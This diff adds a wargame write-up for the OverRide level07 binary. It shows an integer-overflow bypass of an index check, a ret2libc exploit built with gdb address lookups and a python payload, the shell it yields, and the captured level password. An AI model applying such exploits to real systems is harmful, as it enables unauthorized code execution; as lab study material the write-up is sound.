@@ -99,7 +99,7 @@ Dump of assembler code for function main:
    0x080487ad <+138>:	movl   $0xffffffff,0x14(%esp)
    0x080487b5 <+146>:	mov    %eax,%edx
    0x080487b7 <+148>:	mov    $0x0,%eax
-   0x080487bc <+153>:	mov    0x14(%esp),%ecx
+ 0x080487bc <+153>:	mov    0x14(%esp),%ecx
    0x080487c0 <+157>:	mov    %edx,%edi
    0x080487c2 <+159>:	repnz scas %es:(%edi),%al
    0x080487c4 <+161>:	mov    %ecx,%eax
@@ -328,3 +328,127 @@ Dump of assembler code for function store_number:
    0x080486d5 <+165>:	leave
    0x080486d6 <+166>:	ret
 End of assembler dump.
+
+********************************************************************************
+We can see that that this program is a number storage system. A buffer is
+declared on the stack to hold values. The main function is essentially an infinite
+loop that prompts the user for a command. The available commands are :
+- store, to store a number in memory at a specific index, only if this index is
+	not a multiple of 3.
+- read, to print the value stored at a specific index.
+- quit, to quit the program.
+
+We can see that there is no other check than multiples of 3 for the input of
+the store command's index. So we can write 4 bytes anywhere in the memory within
+the range of an unsigned int. The thing is, after bruteforcing a large portion
+of indexes, we were still unable to rewrite EIP pointer after the stack (which
+should normally be somewhere between esp+100 and esp+120). We then assumed that
+we should find a way to bypass the 3 multiple check of indexes in the store_number
+function. This is easily doable by overflowing the index value with the 4 by
+multiplication applied on it, which allows us to give as an input a number that
+is not a multiple of 3, but its multiplication by 4 will be ! With this method,
+we can now bruteforce the entire stack.
+********************************************************************************
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 0
+ Index: 1073741938 (1073741824 + 114)
+ Completed store command successfully
+Input command: quit
+Segmentation fault (core dumped)
+level07@OverRide:~$ dmesg | tail -n1
+[ 3764.145454] level07[1704]: segfault at 0 ip (null) sp 00000000ffffd730 error 14 in level07[8048000+1000]
+********************************************************************************
+We segfault on NULL ! That means we just rewritten the EIP register with our 0
+value. The offset from the start to the EIP buffer is now known : 114 * 4 bytes.
+Now we can't use a shellcode, because the arguments of the main function, as the
+environment are zero-filled at the start of the main, so we have to find another
+way to get a shell or a command executed. We can search for the address of the
+system function into libc, to write it in the eip register, in order to call it.
+We can then find the address of the string "/bin/sh in libc", and write it 4 bytes
+after eip, in order to make it the parameter of system.
+********************************************************************************
+level07@OverRide:~$ gdb ./level07
+(gdb) b main
+Breakpoint 1 at 0x8048729
+(gdb) r
+Starting program: /home/users/level07/level07
+
+Breakpoint 1, 0x08048729 in main ()
+(gdb) info function
+All defined functions:
+...
+0xf7e6aed0  system
+...
+********************************************************************************
+We got the address of system. Now we need to find a string somewhere in the
+binary containing "/bin/sh". Let's use gdb's FIND command on the libc region :
+********************************************************************************
+(gdb) info proc map
+process 1755
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
+	 0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
+	 0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
+	 0x804b000  0x806c000    0x21000        0x0 [heap]
+	0xf7e2b000 0xf7e2c000     0x1000        0x0
+	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+	0xf7fd0000 0xf7fd4000     0x4000        0x0
+	0xf7fda000 0xf7fdb000     0x1000        0x0
+	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+(gdb) FIND 0xf7e2c000, 0xf7fcc000, "/bin/sh"
+0xf7f897ec
+1 pattern found.
+(gdb) x/1s 0xf7f897ec
+0xf7f897ec:	 "/bin/sh"
+********************************************************************************
+Perfect, now we can make our payload by writing system address at buffer[114],
+and "/bin/sh" address 4 bytes later, at buffer[116].
+f7e6aed0 <==> 4159090384
+f7f897ec <==> 4160264172
+********************************************************************************
+level07@OverRide:~$ python -c "print('store\n4159090384\n1073741938\nstore\n4160264172\n116\nquit')" > /tmp/payload
+level07@OverRide:~$ cat /tmp/payload - | ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+ls
+ls: cannot open directory .: Permission denied
+pwd
+/home/users/level07
+whoami
+level08
+cd ../level08
+cat .pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+^CSegmentation fault (core dumped)
